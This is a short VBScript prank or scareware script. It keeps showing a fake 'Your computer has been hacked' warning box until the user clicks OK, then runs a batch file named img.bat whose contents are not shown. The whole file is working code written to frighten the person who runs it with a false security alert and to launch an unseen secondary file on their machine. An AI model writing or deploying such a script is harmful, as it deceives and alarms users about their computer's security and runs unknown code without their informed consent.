Do
	Response = MsgBox("Your computer has been hacked, Press OK to accept", 1+48, "Urgent Warning!")
	If Response = vbOK Then
		Exit Do
	End If
Loop

CreateObject("WScript.Shell").Run "img.bat"